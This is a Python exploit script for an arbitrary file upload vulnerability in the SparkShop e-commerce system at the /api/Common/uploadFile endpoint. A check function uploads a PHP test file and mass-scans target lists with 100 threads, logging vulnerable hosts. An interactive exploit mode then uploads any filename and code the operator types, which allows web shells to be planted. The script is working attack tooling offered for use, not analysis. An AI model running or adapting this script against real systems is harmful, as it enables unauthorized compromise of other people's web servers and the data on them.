import argparse, requests, sys, time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """
███████╗██████╗  █████╗ ██████╗ ██╗  ██╗███████╗██╗  ██╗ ██████╗ ██████╗ 
██╔════╝██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██║  ██║██╔═══██╗██╔══██╗
███████╗██████╔╝███████║██████╔╝█████╔╝ ███████╗███████║██║   ██║██████╔╝
╚════██║██╔═══╝ ██╔══██║██╔══██╗██╔═██╗ ╚════██║██╔══██║██║   ██║██╔═══╝ 
███████║██║     ██║  ██║██║  ██║██║  ██╗███████║██║  ██║╚██████╔╝██║     
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝            
"""
    print(test)


def poc(target):
    payload = '/api/Common/uploadFile'
    url = target + payload
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Type":"multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR"
    }
    data = '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name="file";filename="1.php"\r\n\r\n<?php echo "hello world";?>\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        response = requests.post(url=url, headers=headers, data=data, timeout=5)
        if response.status_code == 200 and "upload success" in response.text:
            print(f"[+] {target} 存在文件上传漏洞！\n")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
                return True
        else:
            print("[-]{target}不存在漏洞！！")
            return False
    except requests.exceptions.ConnectionError as e:
        print(f"该url存在问题{target}: {str(e)}")
    except requests.exceptions.RequestException as e:
        print(f"{target} 请求错误: {str(e)}")
    except Exception as e:
        print(e)
        return False

def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)

    while True:
        filename = input('请输入文件名：')
        code = input('请输入文件的内容：')
        if filename == 'q' or code == 'q':
            print("正在退出,请等候……")
            break
        payload = '/api/Common/uploadFile'
        url = target + payload
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR"
        }
        data = f'------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name="file";filename=f"{filename}"\r\n\r\nf"{code}"\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'

        try:
            response = requests.post(url=url, headers=headers, data=data, timeout=5)
            if response.status_code == 200 and "upload success" in response.text:
                print(f"[+]文件上传成功！\n")
                res = response.json()
                print(res.get('data'))
        except Exception as e:
            print(e)



def main():
    banner()
    parser = argparse.ArgumentParser(description="南京星源图科技_SparkShop_任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help="input your url")
    parser.add_argument('-f', '--file', dest='file', type=str, help='input file path')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
























if __name__ == '__main__':
    main()